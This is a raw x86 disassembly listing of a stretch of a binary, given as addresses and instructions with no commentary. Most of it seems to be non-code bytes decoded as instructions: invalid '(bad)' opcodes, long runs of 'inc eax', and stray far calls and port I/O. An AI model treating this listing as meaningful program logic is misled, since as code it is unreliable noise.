  412da4:	outs   dx,BYTE PTR ds:[esi]
  412da5:	clc    
  412da6:	jns    0x412d71
  412da8:	inc    ebx
  412da9:	xchg   esp,eax
  412daa:	test   eax,0xc01a6791
  412daf:	xchg   ax,ax
  412db1:	inc    eax
  412db2:	imul   edx,DWORD PTR [edi+edi*8+0x75],0x4884a95a
  412dba:	and    dl,BYTE PTR [ecx-0x3c3a9df4]
  412dc0:	inc    ebx
  412dc1:	inc    eax
  412dc2:	inc    eax
  412dc3:	inc    eax
  412dc4:	inc    eax
  412dc5:	inc    eax
  412dc6:	inc    eax
  412dc7:	int3   
  412dc8:	jne    0x412e0a
  412dca:	inc    eax
  412dcb:	mov    bl,0xbf
  412dcd:	push   edx
  412dce:	sbb    eax,ecx
  412dd0:	dec    esp
  412dd1:	rol    DWORD PTR [eax-0x42],1
  412dd4:	jmp    0x412e43
  412dd6:	pushf  
  412dd7:	dec    ecx
  412dd8:	rcr    BYTE PTR [eax+eax*2],0x43
  412ddc:	(bad)  
  412ddd:	mov    ah,0x44
  412ddf:	push   ebx
  412de0:	inc    eax
  412de1:	add    cl,al
  412de3:	inc    eax
  412de4:	inc    eax
  412de5:	inc    eax
  412de6:	inc    eax
  412de7:	add    BYTE PTR [eax-0x4],al
  412dea:	(bad)  
  412deb:	inc    eax
  412dec:	loope  0x412df7
  412dee:	push   es
  412def:	sub    al,0x98
  412df1:	(bad)  
  412df2:	fild   DWORD PTR [eax+0x5e]
  412df5:	inc    eax
  412df6:	sbb    cl,dh
  412df8:	iret   
  412df9:	add    eax,0x312340b4
  412dfe:	std    
  412dff:	dec    eax
  412e00:	lods   eax,DWORD PTR ds:[esi]
  412e01:	leave  
  412e02:	inc    ecx
  412e03:	cdq    
  412e04:	adc    bl,BYTE PTR [ebp+0x70]
  412e07:	popf   
  412e08:	data16 cld 
  412e0a:	inc    ebx
  412e0b:	stos   BYTE PTR es:[edi],al
  412e0c:	and    cl,dl
  412e0e:	repz inc esp
  412e10:	inc    eax
  412e11:	inc    eax
  412e12:	inc    eax
  412e13:	inc    eax
  412e14:	inc    eax
  412e15:	inc    eax
  412e16:	inc    eax
  412e17:	inc    eax
  412e18:	inc    DWORD PTR [eax+0x28]
  412e1b:	cmp    esi,DWORD PTR [eax]
  412e1d:	jl     0x412e4e
  412e1f:	inc    ecx
  412e20:	fsubr  QWORD PTR [esp+ebp*1]
  412e23:	rcr    DWORD PTR [ebx+ebx*4+0x49],cl
  412e27:	push   ecx
  412e28:	adc    eax,0x474128cc
  412e2d:	xchg   edx,eax
  412e2e:	loope  0x412e3e
  412e30:	add    ch,0xec
  412e33:	test   DWORD PTR ss:0x4040344a,edx
  412e3a:	inc    eax
  412e3b:	inc    eax
  412e3c:	inc    eax
  412e3d:	inc    eax
  412e3e:	inc    eax
  412e3f:	inc    eax
  412e40:	inc    eax
  412e41:	inc    eax
  412e42:	jae    0x412e85
  412e44:	test   al,0xb1
  412e46:	inc    ebx
  412e47:	enter  0x30a3,0x91
  412e4b:	out    dx,al
  412e4c:	adc    DWORD PTR [ebx-0x70],edx
  412e4f:	adc    cl,BYTE PTR [edi+eax*2-0x15]
  412e53:	inc    esp
  412e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e55:	cld    
  412e56:	mov    eax,ds:0x7590e1c7
  412e5b:	sub    al,0x40
  412e5d:	inc    eax
  412e5e:	inc    eax
  412e5f:	inc    eax
  412e60:	inc    eax
  412e61:	inc    eax
  412e62:	inc    eax
  412e63:	inc    eax
  412e64:	add    BYTE PTR [edx+0xd],al
  412e67:	inc    ebx
  412e68:	mov    es,WORD PTR [ebx]
  412e6a:	std    
  412e6b:	(bad)  
  412e6c:	retf   0xc9cf
  412e6f:	ror    DWORD PTR [edx-0x2a2bd05f],1
  412e75:	lods   al,BYTE PTR ds:[esi]
  412e76:	adc    BYTE PTR [eax],dh
  412e78:	test   al,0xaf
  412e7a:	cs std 
  412e7c:	push   esp
  412e7d:	gs aas 
  412e7f:	xor    eax,0x313143d1
  412e84:	inc    BYTE PTR [eax+0x62]
  412e87:	inc    eax
  412e88:	inc    eax
  412e89:	inc    eax
  412e8a:	inc    eax
  412e8b:	inc    eax
  412e8c:	inc    eax
  412e8d:	and    eax,0x8f404040
  412e92:	popa   
  412e93:	jecxz  0x412ede
  412e95:	sahf   
  412e96:	inc    esp
  412e97:	sub    bh,BYTE PTR [esi-0x2c8e6961]
  412e9d:	cmp    eax,0x4105102c
  412ea2:	push   0x40a84323
  412ea7:	inc    eax
  412ea8:	inc    eax
  412ea9:	inc    eax
  412eaa:	inc    eax
  412eab:	inc    eax
  412eac:	inc    eax
  412ead:	inc    eax
  412eae:	inc    eax
  412eaf:	inc    eax
  412eb0:	enter  0xc88c,0x43
  412eb4:	inc    eax
  412eb5:	dec    esp
  412eb6:	repnz dec ebp
  412eb8:	int    0x5
  412eba:	inc    edx
  412ebb:	xor    BYTE PTR [eax-0x1b],al
  412ebe:	and    DWORD PTR [ecx+0x47],eax
  412ec1:	int    0xca
  412ec3:	pop    eax
  412ec4:	inc    eax
  412ec5:	push   eax
  412ec6:	dec    esi
  412ec7:	pop    ebp
  412ec8:	out    dx,al
  412ec9:	add    BYTE PTR [ebx+eax*2-0x3bec5ec0],ch
  412ed0:	inc    esp
  412ed1:	sub    dl,BYTE PTR ds:0xb113ddd
  412ed7:	inc    eax
  412ed8:	inc    eax
  412ed9:	inc    eax
  412eda:	inc    eax
  412edb:	inc    eax
  412edc:	inc    eax
  412edd:	rol    DWORD PTR [eax+0x40],0x4c
  412ee1:	sub    al,0x48
  412ee3:	retf   
  412ee4:	imul   ebp,esp,0x65
  412ee7:	xchg   ebp,eax
  412ee8:	call   0xa78675b3
  412eed:	and    eax,DWORD PTR [eax+0x40]
  412ef0:	add    BYTE PTR [eax+0x40],al
  412ef3:	inc    eax
  412ef4:	inc    eax
  412ef5:	inc    eax
  412ef6:	inc    eax
  412ef7:	dec    ecx
  412ef8:	sub    ebp,DWORD PTR [ebx]
  412efa:	(bad)
  412efd:	mov    esi,0x3bdb61e1
  412f02:	inc    edx
  412f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f04:	and    BYTE PTR [ebx-0x38],al
  412f07:	inc    ebx
  412f08:	aaa    
  412f09:	cmp    esi,ebx
  412f0b:	(bad)  
  412f0c:	(bad)  
  412f0d:	ror    BYTE PTR [edi],cl
  412f0f:	loopne 0x412f52
  412f11:	pop    eax
  412f12:	sub    BYTE PTR [eax+0x40],al
  412f15:	inc    eax
  412f16:	inc    eax
  412f17:	inc    eax
  412f18:	inc    eax
  412f19:	inc    eax
  412f1a:	inc    eax
  412f1b:	inc    eax
  412f1c:	inc    eax
  412f1d:	inc    eax
  412f1e:	dec    edi
  412f1f:	push   edx
  412f20:	jg     0x412f4b
  412f22:	jno    0x412f14
  412f24:	inc    esp
  412f25:	sub    cl,BYTE PTR [ecx+0x42be124c]
  412f2b:	adc    ch,BYTE PTR ds:0x40404090
  412f31:	inc    eax
  412f32:	inc    eax
  412f33:	inc    eax
  412f34:	int3   
  412f35:	jne    0x412f77
  412f37:	lds    ebp,FWORD PTR [eax-0x574eb32b]
  412f3d:	les    edx,FWORD PTR ds:0xa1adcfb8
  412f43:	push   eax
  412f44:	cmp    DWORD PTR [edx-0x37],0xc539410d
  412f4b:	sbb    eax,0xf68c3116
  412f50:	inc    ebx
  412f51:	or     ah,ch
  412f53:	push   edx
  412f54:	arpl   WORD PTR [ebp+0xd],sp
  412f57:	dec    edi
  412f58:	xor    BYTE PTR [eax],cl
  412f5a:	dec    ecx
  412f5b:	xchg   ebx,eax
  412f5c:	inc    eax
  412f5d:	add    cl,al
  412f5f:	inc    eax
  412f60:	inc    eax
  412f61:	inc    eax
  412f62:	inc    eax
  412f63:	add    BYTE PTR [eax+0x41],al
  412f66:	inc    esp
  412f67:	leave  
  412f68:	mov    eax,0x4aa1b454
  412f6d:	enter  0x922c,0x5
  412f71:	inc    edi
  412f72:	jo     0x412f47
  412f74:	mov    cl,0x7c
  412f76:	ret    0xc873
  412f79:	test   DWORD PTR [ebx-0x5f],edx
  412f7c:	dec    edx
  412f7d:	or     ecx,ebp
  412f7f:	mov    ah,0x41
  412f81:	inc    ebx
  412f82:	cmp    ebp,DWORD PTR [ebx+0x40]
  412f85:	inc    eax
  412f86:	inc    eax
  412f87:	inc    eax
  412f88:	inc    eax
  412f89:	inc    eax
  412f8a:	inc    eax
  412f8b:	inc    eax
  412f8c:	inc    DWORD PTR [eax-0x41]
  412f8f:	popa   
  412f90:	push   eax
  412f91:	or     eax,0x2594906c
  412f96:	sub    DWORD PTR [ebp-0x32],ecx
  412f99:	retf   
  412f9a:	mov    eax,0xf338465b
  412f9f:	fs pusha 
  412fa1:	dec    edx
  412fa2:	add    eax,0x25243943
  412fa7:	pop    es
  412fa8:	inc    esp
  412fa9:	jno    0x412f75
  412fab:	shl    DWORD PTR [eax],1
  412fad:	and    al,0x40
  412faf:	inc    eax
  412fb0:	inc    eax
  412fb1:	inc    eax
  412fb2:	inc    eax
  412fb3:	inc    eax
  412fb4:	inc    eax
  412fb5:	inc    eax
  412fb6:	inc    eax
  412fb7:	inc    eax
  412fb8:	pop    ds
  412fb9:	and    BYTE PTR ds:0x74f4838,ch
  412fbf:	inc    edx
  412fc0:	mov    edi,0xab65c055
  412fc5:	push   esi
  412fc6:	aad    0xe1
  412fc8:	xor    eax,0x4082c5cb
  412fcd:	inc    eax
  412fce:	inc    eax
  412fcf:	inc    eax
  412fd0:	inc    eax
  412fd1:	inc    eax
  412fd2:	inc    eax
  412fd3:	inc    eax
  412fd4:	add    BYTE PTR [eax-0x58],dl
  412fd7:	cmp    BYTE PTR [ebp+0xc47119f],bh
  412fdd:	mov    eax,0x7d4937b5
  412fe2:	jle    0x412fd2
  412fe4:	bound  eax,QWORD PTR ds:0xfda11d41
  412fea:	xor    eax,DWORD PTR [esp+eax*8-0x7a]
  412fee:	inc    ebx
  412fef:	inc    eax
  412ff0:	inc    eax
  412ff1:	inc    eax
  412ff2:	inc    eax
  412ff3:	inc    eax
  412ff4:	inc    eax
  412ff5:	and    eax,0xfe404040
  412ffa:	inc    esp
  412ffb:	xor    eax,0x924f2c4d
  413000:	xor    BYTE PTR [edx+eiz*4-0x69c13421],dl
  413007:	mov    edi,0x4033c850
  41300c:	or     dl,ch
  41300e:	cli    
  41300f:	ins    BYTE PTR es:[edi],dx
  413010:	inc    edi
  413011:	inc    esi
  413012:	dec    esp
  413013:	push   edi
  413014:	inc    ecx
  413015:	inc    edi
  413016:	push   edx
  413017:	adc    BYTE PTR [ebp+0x4040a1cf],al
  41301d:	inc    eax
  41301e:	inc    eax
  41301f:	inc    eax
  413020:	inc    eax
  413021:	inc    eax
  413022:	inc    eax
  413023:	inc    eax
  413024:	inc    eax
  413025:	push   esi
  413026:	(bad)  
  413027:	out    dx,al
  413028:	jns    0x413072
  41302a:	inc    ebx
  41302b:	shl    DWORD PTR [ebx+0x3f],cl
  41302e:	addr16 inc esp
  413030:	fadd   QWORD PTR [eax-0x70]
  413033:	inc    eax
  413034:	popa   
  413035:	pusha  
  413036:	imul   ebp,DWORD PTR [ebx+ebp*1],0x4040784f
  41303d:	inc    eax
  41303e:	inc    eax
  41303f:	inc    eax
  413040:	inc    eax
  413041:	rol    DWORD PTR [eax+0x40],0x40
  413045:	inc    ecx
  413046:	mov    esp,0x38c43cac
  41304b:	inc    ebx
  41304c:	inc    eax
  41304d:	mov    eax,ds:0x62562d32
  413052:	inc    ebp
  413053:	rol    DWORD PTR [eax+0x61],1
  413056:	jns    0x4130a4
  413058:	lea    edi,[ebx+0x40]
  41305b:	inc    eax
  41305c:	add    BYTE PTR [eax+0x40],al
  41305f:	inc    eax
  413060:	inc    eax
  413061:	inc    eax
  413062:	inc    eax
  413063:	test   al,0x86
  413065:	(bad)  [ecx+0x14]
  413068:	and    al,0x44
  41306a:	mov    eax,0x76f52a11
  41306f:	mov    ebp,0x4c522c80
  413074:	sub    al,0x80
  413076:	and    eax,0x40404036
  41307b:	inc    eax
  41307c:	inc    eax
  41307d:	inc    eax
  41307e:	inc    eax
  41307f:	inc    eax
  413080:	inc    eax
  413081:	inc    eax
  413082:	sub    BYTE PTR [edx],bh
  413084:	les    eax,FWORD PTR [ecx-0x1c]
  413087:	out    0x9f,eax
  413089:	inc    esp
  41308a:	stc    
  41308b:	lds    ecx,FWORD PTR [edi-0x64]
  41308e:	inc    ecx
  41308f:	inc    edi
  413090:	addr16 jb 0x4130d3
  413093:	inc    eax
  413094:	inc    eax
  413095:	inc    eax
  413096:	inc    eax
  413097:	inc    eax
  413098:	int3   
  413099:	jne    0x4130db
  41309b:	jle    0x4130ac
  41309d:	jns    0x4130db
  41309f:	inc    ebx
  4130a0:	retf   
  4130a1:	popa   
  4130a2:	xor    BYTE PTR [edx+0x1e],ah
  4130a5:	jb     0x413103
  4130a7:	xor    BYTE PTR [esi],bh
  4130a9:	popa   
  4130aa:	inc    edx
  4130ab:	cmp    ah,BYTE PTR [ebx+ebp*2+0x21]
  4130af:	dec    esp
  4130b0:	dec    ecx
  4130b1:	loope  0x413088
  4130b3:	inc    eax
  4130b4:	add    cl,al
  4130b6:	inc    eax
  4130b7:	inc    eax
  4130b8:	inc    eax
  4130b9:	inc    eax
  4130ba:	add    BYTE PTR [eax+0x24],al
  4130bd:	inc    esp
  4130be:	push   ds
  4130bf:	popa   
  4130c0:	inc    edi
  4130c1:	jecxz  0x413109
  4130c3:	jnp    0x413129
  4130c5:	sub    al,0x79
  4130c7:	arpl   WORD PTR [ebp+0x40f5a17d],ax
  4130cd:	inc    eax
  4130ce:	inc    eax
  4130cf:	inc    eax
  4130d0:	inc    eax
  4130d1:	inc    eax
  4130d2:	inc    eax
  4130d3:	inc    eax
  4130d4:	inc    DWORD PTR [eax-0x72]
  4130d7:	cmp    ch,bl
  4130d9:	inc    eax
  4130da:	inc    ebx
  4130db:	dec    eax
  4130dc:	pop    edx
  4130dd:	inc    esi
  4130de:	pusha  
  4130df:	dec    ebp
  4130e0:	imul   eax,DWORD PTR [ecx],0xffffff90
  4130e3:	sub    ah,dl
  4130e5:	mov    bl,0x65
  4130e7:	lea    edx,[eax-0x3c]
  4130ea:	adc    eax,0x52742fbf
  4130ef:	inc    esp
  4130f0:	pop    edx
  4130f1:	mov    eax,0x40404040
  4130f6:	inc    eax
  4130f7:	inc    eax
  4130f8:	inc    eax
  4130f9:	inc    eax
  4130fa:	inc    eax
  4130fb:	inc    eax
  4130fc:	inc    ebx
  4130fd:	arpl   WORD PTR [edx-0x6b],cx
  413100:	dec    esp
  413101:	sub    al,0x47
  413103:	test   al,0xd1
  413105:	imul   esp,DWORD PTR [ecx+0x7c3624d9],0x5
  41310c:	div    DWORD PTR [ecx+0x34]
  41310f:	xor    eax,DWORD PTR [eax+0x40]
  413112:	inc    eax
  413113:	inc    eax
  413114:	inc    eax
  413115:	inc    eax
  413116:	inc    eax
  413117:	inc    eax
  413118:	add    cl,ch
  41311a:	int    0x69
  41311c:	xchg   DWORD PTR [edx+0x32],ecx
  41311f:	jecxz  0x413140
  413121:	fadd   DWORD PTR [edx-0x5f]
  413124:	inc    eax
  413125:	rcl    DWORD PTR [ebp+eax*8+0x74fe656a],1
  41312c:	mov    edi,0xb323c0d8
  413131:	mov    esp,0x41054744
  413136:	repz mov bh,0x44
  413139:	adc    eax,0x40867e2c
  41313e:	inc    eax
  41313f:	inc    eax
  413140:	inc    eax
  413141:	inc    eax
  413142:	inc    eax
  413143:	and    eax,0x43404040
  413148:	bound  edx,QWORD PTR [ecx-0x69]
  41314b:	inc    ecx
  41314c:	xor    al,0x6a
  41314e:	dec    eax
  41314f:	xor    BYTE PTR [ecx+eiz*4],cl
  413152:	inc    ebx
  413153:	mov    BYTE PTR [eax+0x40],0x40
  413157:	inc    eax
  413158:	inc    eax
  413159:	inc    eax
  41315a:	inc    eax
  41315b:	inc    eax
  41315c:	inc    eax
  41315d:	inc    eax
  41315e:	lds    esi,FWORD PTR [ebx+0x3d]
  413161:	dec    eax
  413162:	xchg   ebx,eax
  413163:	cmp    al,dh
  413165:	jae    0x4131c0
  413167:	and    BYTE PTR [eax+0x47],dh
  41316a:	call   0xee909210
  41316f:	mov    DWORD PTR [edx-0x7b],esp
  413172:	and    dh,BYTE PTR [esi]
  413174:	push   ebx
  413175:	cmp    BYTE PTR [ecx+ebp*4+0x5],al
  413179:	inc    ebx
  41317a:	push   0x404040e1
  41317f:	inc    eax
  413180:	inc    eax
  413181:	inc    eax
  413182:	rol    DWORD PTR [eax+0x40],0x55
  413186:	inc    esi
  413187:	sub    al,0xac
  413189:	int3   
  41318a:	nop
  41318b:	int3   
  41318c:	push   esp
  41318d:	jbe    0x4131b3
  41318f:	xor    bh,BYTE PTR [ebx+0x4d]
  413192:	xor    bh,bl
  413194:	and    edx,DWORD PTR [ebx]
  413196:	data16 aad 0x8f
  413199:	inc    eax
  41319a:	inc    eax
  41319b:	add    BYTE PTR [eax+0x40],al
  41319e:	inc    eax
  41319f:	inc    eax
  4131a0:	inc    eax
  4131a1:	inc    eax
  4131a2:	bound  eax,QWORD PTR [ebx+0x7f]
  4131a5:	push   esi
  4131a6:	inc    ebp
  4131a7:	out    dx,al
  4131a8:	push   eax
  4131a9:	fs or  al,0xd1
  4131ac:	mov    bh,0x64
  4131ae:	adc    ebp,DWORD PTR [eax+0x32a979ee]
  4131b4:	(bad)  
  4131b5:	xor    ebp,DWORD PTR [eax]
  4131b7:	cs inc esp
  4131b9:	cld    
  4131ba:	adc    BYTE PTR [ebx+0x11],0x65
  4131be:	mov    cl,0xd7
  4131c0:	sub    al,0xac
  4131c2:	inc    eax
  4131c3:	inc    eax
  4131c4:	inc    eax
  4131c5:	inc    eax
  4131c6:	inc    eax
  4131c7:	inc    eax
  4131c8:	inc    eax
  4131c9:	inc    eax
  4131ca:	inc    eax
  4131cb:	inc    eax
  4131cc:	jae    0x4131e9
  4131ce:	out    0x21,al
  4131d0:	scas   eax,DWORD PTR es:[edi]
  4131d1:	adc    al,0x30
  4131d3:	add    eax,0x4a624347
  4131d8:	push   edx
  4131d9:	xor    ch,cl
  4131db:	xchg   DWORD PTR [edx+0x41],eax
  4131de:	push   ebx
  4131df:	fs adc ah,cl
  4131e2:	dec    edx
  4131e3:	inc    eax
  4131e4:	inc    eax
  4131e5:	inc    eax
  4131e6:	inc    eax
  4131e7:	inc    eax
  4131e8:	inc    eax
  4131e9:	int3   
  4131ea:	jne    0x41322c
  4131ec:	je     0x4131ef
  4131ee:	inc    ebx
  4131ef:	retf   0x2cbb
  4131f2:	adc    ch,dh
  4131f4:	inc    ecx
  4131f5:	loopne 0x413227
  4131f7:	stc    
  4131f8:	adc    BYTE PTR ds:0x642f4474,dl
  4131fe:	inc    esp
  4131ff:	pop    edx
  413200:	and    bh,BYTE PTR [edi]
  413202:	cli    
  413203:	sub    al,0xdc
  413205:	repz inc edi
  413207:	pop    ds
  413208:	and    edx,DWORD PTR ds:0xc1004041
  41320e:	inc    eax
  41320f:	inc    eax
  413210:	inc    eax
  413211:	inc    eax
  413212:	add    BYTE PTR [eax+0x2e],al
  413215:	inc    eax
  413216:	rol    BYTE PTR [ebp-0x3bc0b6c8],0xc5
  41321d:	cld    
  41321e:	sbb    BYTE PTR [ebx+0x5d],al
  413221:	mov    ds:0x2f1e6873,al
  413226:	seto   BYTE PTR [eax-0x534aedd]
  41322d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41322e:	(bad)  
  413230:	popa   
  413231:	dec    edi
  413232:	adc    BYTE PTR [esp+eax*2],bl
  413235:	dec    edi
  413236:	bound  eax,QWORD PTR [eax+0x40]
  413239:	inc    eax
  41323a:	inc    eax
  41323b:	inc    eax
  41323c:	inc    eax
  41323d:	inc    eax
  41323e:	inc    eax
  41323f:	inc    DWORD PTR [eax+0x43]
  413242:	mul    eax
  413244:	shl    DWORD PTR [ecx],1
  413246:	sub    al,0x88
  413248:	(bad)  
  41324a:	cwde   
  41324b:	sub    BYTE PTR [eax+0x62],ah
  41324e:	sub    al,0x55
  413250:	add    eax,0x737420ed
  413255:	dec    esp
  413256:	aad    0x6a
  413258:	retf   
  413259:	loop   0x4132b1
  41325b:	push   0x41
  41325d:	and    al,0x57
  41325f:	int3   
  413260:	inc    esp
  413261:	out    dx,eax
  413262:	dec    ecx
  413263:	daa    
  413264:	xchg   ecx,eax
  413265:	inc    eax
  413266:	inc    eax
  413267:	inc    eax
  413268:	inc    eax
  413269:	inc    eax
  41326a:	inc    eax
  41326b:	inc    eax
  41326c:	inc    eax
  41326d:	inc    eax
  41326e:	inc    eax
  41326f:	int3   
  413270:	ficom  WORD PTR [esi+0x2ab582ce]
  413276:	jmp    FWORD PTR [eax]
  413278:	xor    BYTE PTR [eax+0x5a],bh
  41327b:	sub    bl,al
  41327d:	dec    ecx
  41327e:	pop    edx
  41327f:	fwait
  413280:	inc    esp
  413281:	test   al,0x6a
  413283:	inc    eax
  413284:	outs   dx,BYTE PTR ds:[esi]
  413285:	mov    eax,ds:0x122dea53
  41328a:	jg     0x4132cc
  41328c:	hlt    
  41328d:	inc    eax
  41328e:	inc    eax
  41328f:	inc    eax
  413290:	inc    eax
  413291:	inc    eax
  413292:	inc    eax
  413293:	inc    eax
  413294:	inc    eax
  413295:	add    BYTE PTR [eax+0x67],dh
  413298:	arpl   WORD PTR [edx],bp
  41329a:	lods   al,BYTE PTR ds:[esi]
  41329b:	into   
  41329c:	inc    edx
  41329d:	add    edx,esp
  41329f:	mov    cl,0x45
  4132a1:	int    0x42
  4132a3:	addr16 inc eax
  4132a5:	pop    es
  4132a6:	test   eax,0xf8173cc8
  4132ab:	aam    0x46
  4132ad:	sub    ecx,DWORD PTR [edi+0x40]
  4132b0:	inc    eax
  4132b1:	inc    eax
  4132b2:	inc    eax
  4132b3:	inc    eax
  4132b4:	inc    eax
  4132b5:	and    eax,0x53404040
  4132ba:	or     al,0xea
  4132bc:	and    al,0x7d
  4132be:	inc    edi
  4132bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c0:	sub    BYTE PTR [eax+esi*2+0x44],0x50
  4132c5:	dec    esp
  4132c6:	test   dh,dl
  4132c8:	adc    DWORD PTR [ecx+edi*2+0x2c],edx
  4132cc:	or     BYTE PTR [ebx+0x43],ah
  4132cf:	dec    eax
  4132d0:	sub    BYTE PTR ds:0x6d43289e,0x90
  4132d7:	push   esi
  4132d8:	or     eax,0x2ac5635a
  4132dd:	loopne 0x41331f
  4132df:	inc    eax
  4132e0:	inc    eax
  4132e1:	inc    eax
  4132e2:	inc    eax
  4132e3:	inc    eax
  4132e4:	inc    eax
  4132e5:	inc    eax
  4132e6:	inc    eax
  4132e7:	inc    eax
  4132e8:	in     al,dx
  4132e9:	pop    esp
  4132ea:	fcmovnu st,st(3)
  4132ec:	mov    eax,0x43632674
  4132f1:	dec    esi
  4132f2:	mov    cl,0x6b
  4132f4:	adc    eax,0xd101a8ee
  4132f9:	xchg   esp,eax
  4132fa:	stos   DWORD PTR es:[edi],eax
  4132fb:	sar    DWORD PTR [edi+0x40404040],1
  413301:	inc    eax
  413302:	inc    eax
  413303:	rol    DWORD PTR [eax+0x40],0x44
  413307:	pop    es
  413308:	push   esp
  413309:	or     esp,DWORD PTR [edx+0x2c405b84]
  41330f:	xor    bl,BYTE PTR [edx]
  413311:	ja     0x413315
  413313:	xchg   edi,eax
  413314:	jno    0x413340
  413316:	es push esi
  413318:	fiadd  DWORD PTR [eax+0x40]
  41331b:	add    BYTE PTR [eax+0x40],al
  41331e:	inc    eax
  41331f:	inc    eax
  413320:	inc    eax
  413321:	inc    eax
  413322:	mov    cl,0x4b
  413324:	mov    eax,ds:0x705642b7
  413329:	arpl   WORD PTR [eax+0x2c68d613],bp
  41332f:	lea    edx,[ebx-0x6e]
  413332:	inc    eax
  413333:	inc    eax
  413334:	inc    eax
  413335:	inc    eax
  413336:	inc    eax
  413337:	inc    eax
  413338:	inc    eax
  413339:	inc    eax
  41333a:	inc    eax
  41333b:	inc    eax
  41333c:	inc    ecx
  41333d:	lds    eax,FWORD PTR [ebx]
  41333f:	mul    DWORD PTR [esp+eax*2-0x75bc8c4c]
  413346:	or     al,0x56
  413348:	push   ebx
  413349:	sub    al,0xe4
  41334b:	ins    DWORD PTR es:[edi],dx
  41334c:	xor    BYTE PTR [eax+0x40],al
  41334f:	inc    eax
  413350:	inc    eax
  413351:	inc    eax
  413352:	inc    eax
  413353:	int3   
  413354:	jne    0x413396
  413356:	mov    ds:0x24bc7587,eax
  41335b:	xor    eax,0xdea7bcd2
  413360:	push   edi
  413361:	add    eax,0x472068cd
  413366:	lds    ecx,FWORD PTR [ecx-0x3effbf6f]
  41336c:	inc    eax
  41336d:	inc    eax
  41336e:	inc    eax
  41336f:	inc    eax
  413370:	add    BYTE PTR [eax+0x1b],al
  413373:	dec    ebx
  413374:	add    dh,bl
  413376:	test   ebx,ebx
  413378:	ss push cs
  41337a:	call   0x8140:0x436148fe
  413381:	jo     0x4133e6
  413383:	inc    esp
  413384:	xor    esi,ecx
  413386:	nop
  413387:	pusha  
  413388:	inc    esi
  413389:	es inc ebp
  41338b:	sub    al,0xc1
  41338d:	sti    
  41338e:	mov    DWORD PTR [eax-0x7e],eax
  413391:	sbb    BYTE PTR [edx],ch
  413393:	inc    eax
  413394:	inc    eax
  413395:	inc    eax
  413396:	inc    eax
  413397:	inc    eax
  413398:	inc    eax
  413399:	inc    eax
  41339a:	inc    eax
  41339b:	inc    DWORD PTR [eax+0x22]
  41339e:	and    ebp,DWORD PTR [ebx+0x332d4043]
  4133a4:	push   ebx
  4133a5:	(bad)
  4133a8:	rol    DWORD PTR [eax+0x1],1
  4133ab:	dec    ecx
  4133ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133ad:	push   edi
  4133ae:	push   0x25071da
  4133b3:	jb     0x413394
  4133b5:	(bad)  
  4133b6:	mov    ah,0x62
  4133b8:	sub    eax,0x403a3d40
  4133bd:	inc    eax
  4133be:	inc    eax
  4133bf:	inc    eax
  4133c0:	inc    eax
  4133c1:	inc    eax
  4133c2:	inc    eax
  4133c3:	inc    eax
  4133c4:	inc    eax
  4133c5:	inc    eax
  4133c6:	adc    DWORD PTR [ebp+eax*1-0x41],eax
  4133ca:	imul   eax,DWORD PTR [eax+0x27],0xe42c9cb6
  4133d1:	fs std 
  4133d3:	inc    eax
  4133d4:	push   esp
  4133d5:	pop    es
  4133d6:	and    BYTE PTR gs:[esi],ch
  4133d9:	mov    ebp,0x12015041
  4133de:	pusha  
  4133df:	pop    edx
  4133e0:	fs push edx
  4133e2:	inc    ebx
  4133e3:	inc    eax
  4133e4:	aaa    
  4133e5:	inc    eax
  4133e6:	inc    eax
  4133e7:	inc    eax
  4133e8:	inc    eax
  4133e9:	inc    eax
  4133ea:	inc    eax
  4133eb:	inc    eax
  4133ec:	inc    eax
  4133ed:	add    BYTE PTR [ebx],dl
  4133ef:	inc    ebx
  4133f0:	popf   
  4133f1:	jbe    0x4133b3
  4133f3:	xor    BYTE PTR [eax-0x7b],al
  4133f6:	inc    eax
  4133f7:	mov    cl,0x48
  4133f9:	xor    eax,0x2440b8cb
  4133fe:	push   ebx
  4133ff:	addr16 cmp al,0xbf
  413402:	mov    edi,0x40831047
  413407:	inc    eax
  413408:	inc    eax
  413409:	inc    eax
  41340a:	inc    eax
  41340b:	inc    eax
  41340c:	and    eax,0x72404040
  413411:	push   eax
  413412:	push   ds
  413413:	adc    al,0xbf
  413415:	test   DWORD PTR [eax+0x1f],eax
  413418:	pop    ds
  413419:	cmc    
  41341a:	push   ecx
  41341b:	pop    es
  41341c:	in     eax,dx
  41341d:	pusha  
  41341e:	inc    eax
  41341f:	mov    DWORD PTR [edx+0x2a],esi
  413422:	popf   
  413423:	(bad)  
  413424:	(bad)  
  413425:	lock inc eax
  413427:	add    DWORD PTR [edi],ebx
  413429:	fs inc esp
  41342b:	adc    eax,0x1910a8a8
  413430:	jb     0x413472
  413432:	inc    eax
  413433:	inc    eax
  413434:	inc    eax
  413435:	inc    eax
  413436:	inc    eax
  413437:	inc    eax
  413438:	inc    eax
  413439:	inc    eax
  41343a:	inc    eax
  41343b:	push   ds
  41343c:	sub    al,0xc9
  41343e:	adc    ah,BYTE PTR [esi-0x3be039c0]
  413444:	sbb    al,0xb8
  413446:	add    DWORD PTR [ebx+0x40],eax
  413449:	or     DWORD PTR [edx-0x35],esi
  41344c:	dec    eax
  41344d:	xchg   esp,eax
  41344e:	push   esp
  41344f:	inc    eax
  413450:	inc    eax
  413451:	inc    eax
  413452:	inc    eax
  413453:	inc    eax
  413454:	inc    eax
  413455:	rol    DWORD PTR [eax+0x40],0xd2
  413459:	inc    ecx
  41345a:	pop    edx
  41345b:	pop    ds
  41345c:	adc    BYTE PTR [ebp-0x2fa73229],bl
  413462:	or     DWORD PTR [eax+0x74],0x40406244
  413469:	add    BYTE PTR [eax+0x40],al
  41346c:	inc    eax
  41346d:	inc    eax
  41346e:	inc    eax
  41346f:	inc    eax
  413470:	mov    esp,0xdf3f40d0
  413475:	es sub al,0x6b
  413478:	or     eax,0xff414072
  41347d:	loope  0x413499
  41347f:	push   eax
  413480:	retf   
  413481:	fld    DWORD PTR [eax-0x80]
  413484:	dec    ecx
  413485:	or     ebp,edx
  413487:	adc    eax,0x334041b0
  41348c:	pop    edi
  41348d:	or     BYTE PTR [esi+0x40434ccb],ah
  413493:	add    eax,0x40404040
  413498:	inc    eax
  413499:	inc    eax
  41349a:	inc    eax
  41349b:	inc    eax
  41349c:	inc    eax
  41349d:	inc    eax
  41349e:	jb     0x4134c2
  4134a0:	xchg   esi,eax
